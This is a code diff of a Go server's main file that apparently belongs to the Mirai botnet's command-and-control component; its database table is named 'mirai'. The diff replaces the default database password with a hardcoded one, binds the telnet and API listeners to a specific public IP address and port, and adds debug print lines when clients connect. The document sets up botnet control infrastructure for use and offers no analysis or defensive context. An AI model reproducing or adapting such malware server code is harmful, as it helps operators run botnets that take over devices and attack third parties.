@@ -9,20 +9,20 @@ import (
 
 const DatabaseAddr string   = "127.0.0.1"
 const DatabaseUser string   = "root"
-const DatabasePass string   = "password"
+const DatabasePass string   = "de)#nd#$@"
 const DatabaseTable string  = "mirai"
 
 var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
-    tel, err := net.Listen("tcp", "0.0.0.0:23")
+    tel, err := net.Listen("tcp", "128.95.190.65:24")
     if err != nil {
         fmt.Println(err)
         return
     }
 
-    api, err := net.Listen("tcp", "0.0.0.0:101")
+    api, err := net.Listen("tcp", "128.95.190.65:101")
     if err != nil {
         fmt.Println(err)
         return
@@ -34,6 +34,8 @@ func main() {
             if err != nil {
                 break
             }
+
+	    fmt.Println("accepted a client **")
             go apiHandler(conn)
         }
     }()
@@ -43,6 +45,7 @@ func main() {
         if err != nil {
             break
         }
+fmt.Println("accepted a client **, tel")
         go initialHandler(conn)
     }
 
